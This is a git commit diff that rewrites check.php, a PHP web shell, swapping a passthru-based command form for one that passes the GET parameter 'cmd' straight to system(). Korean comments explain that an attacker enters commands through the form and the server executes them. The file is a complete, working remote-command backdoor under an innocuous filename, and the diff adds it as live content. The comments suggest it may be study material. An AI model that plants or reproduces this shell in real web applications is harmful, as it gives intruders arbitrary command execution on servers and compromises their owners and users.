8b7938c56d5ba5eede84c519eb402380750b53e8
lawliet0424 <113508209+lawliet0424@users.noreply.github.com>
2023-04-12 19:26:21 +0900

    Update check.php

--- check.php
+++ check.php
@@ -1,11 +1,19 @@
-<? 
+<?php
 
-        echo "
-                <FORM ACTION=$PHP_SELF METHOD=POST>
-                CMD : <INPUT TYPE=TEXT NAME=command SIZE=40>
-                <INPUT TYPE=SUBMIT VALUE='Enter'></FORM>
-                <HR><XMP></XMP><HR>";
+echo 'Enter a Command:<br>';
+echo '<form action="">';
+echo '<input type=text name="cmd">';
+echo '<input type="submit">';
+echo '</form>';					
 
-        $command = str_replace('/', '', $command);
-        echo "<XMP>"; passthru($command); echo "</XMP>";
+/*
+	echo 부분은 명령어를 입력받을 수 있는 폼을 제공
+    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
+*/
+
+if(isset($_GET['cmd'])){
+	system($_GET['cmd']);
+}
+//system 함수를 통해 전달된 명령어가 실행된다.
+
 ?>
